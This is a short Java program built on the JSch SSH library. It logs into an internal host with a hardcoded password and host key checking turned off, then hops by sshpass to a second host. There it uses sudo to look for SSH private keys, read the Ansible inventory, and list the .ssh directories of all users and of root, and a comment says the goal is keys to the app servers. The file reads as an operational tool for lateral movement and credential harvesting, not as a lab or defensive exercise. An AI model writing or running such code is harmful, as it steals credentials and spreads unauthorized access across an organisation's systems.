import com.jcraft.jsch.*;
import java.io.*;
class DK2 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    // SSH hop from infra host 10.14.16.10 - they might have keys to app servers
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.14.16.10 'echo ---SSH-KEYS---;sudo find / -maxdepth 5 -name id_rsa -o -name id_ed25519 2>/dev/null | grep -v proc | head -10;echo ---ANSIBLE-INVENTORY---;sudo cat /etc/ansible/hosts 2>/dev/null;sudo find / -maxdepth 4 -name \"inventory*\" -o -name \"hosts.yml\" -o -name \"hosts.yaml\" 2>/dev/null | head -5;echo ---SSH-ALL-USERS---;for d in /home/*/.ssh/; do echo \"==$d==\";sudo ls $d 2>/dev/null;done;sudo ls /root/.ssh/ 2>/dev/null' 2>&1 | head -40");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
